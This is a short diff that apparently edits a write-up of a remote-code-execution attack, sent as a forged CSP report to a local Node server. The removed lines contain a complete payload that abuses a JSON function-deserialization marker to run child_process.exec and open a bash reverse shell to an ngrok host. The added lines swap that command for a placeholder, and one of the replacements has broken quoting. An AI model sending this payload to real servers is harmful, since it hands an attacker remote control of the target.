@@ -121,7 +121,7 @@ Host: localhost:3380
 Content-Length: 386
 Content-Type: application/csp-report
 
-{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/18843 0>&1'\", {stdio:\"inherit\"})"}}}}
+{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"COMMAND TO OPEN A REVERSE SHELL"})"}}}}
 ```
 
 On here? 
@@ -144,7 +144,7 @@ Host: localhost:3380
 Content-Length: 386
 Content-Type: application/csp-report
 
-{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec(\"bash -c 'bash -i >& /dev/tcp/4.tcp.ngrok.io/18843 0>&1'\", {stdio:\"inherit\"})"}}}}
+{"csp-report": {"blocked-uri": "x", "document-uri": "X", "effective-directive": "X", "original-policy": "X", "referrer": "X", "status-code": "X", "violated-directive": "X", "source-file": {"toString": {"___js-to-json-class___": "Function", "json": "process.mainModule.require(\"child_process\").exec("COMMAND TO OPEN A REVERSE SHELL"}}}}
 ```
 
 Which looks _exactly_ like the POST request we would send to the HTTP server. 
